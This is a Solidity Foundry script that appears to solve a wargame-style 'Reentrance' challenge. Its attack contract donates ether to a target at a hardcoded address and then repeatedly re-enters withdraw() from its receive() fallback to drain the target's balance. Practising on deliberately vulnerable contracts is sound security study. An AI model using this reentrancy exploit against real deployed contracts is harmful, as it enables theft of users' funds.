//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Script.sol";

interface IReentrance {

    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint);

    function withdraw(uint _amount) external;

    function balances(address) external view returns (uint);

}

contract AttackReentrance {

    IReentrance public reentrance = IReentrance(payable(0x3BA2cC67ecaAF926DFe3B92250c6Ea85143AD568));

    constructor() payable {
        reentrance.donate{value: msg.value}(address(this));
        reentrance.withdraw(msg.value);
    }

    receive() external payable {

       uint contractBalance = address(reentrance).balance;
       uint myBalance = reentrance.balanceOf(address(this));

       uint withdrawAmount = contractBalance < myBalance
          ? contractBalance
          : myBalance;

        if (withdrawAmount > 0) {
        reentrance.withdraw(withdrawAmount);
        }
    }
}

contract ReentranceSolution is Script {
    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        new AttackReentrance{value: 1 ether}();
        vm.stopBroadcast();
    }
}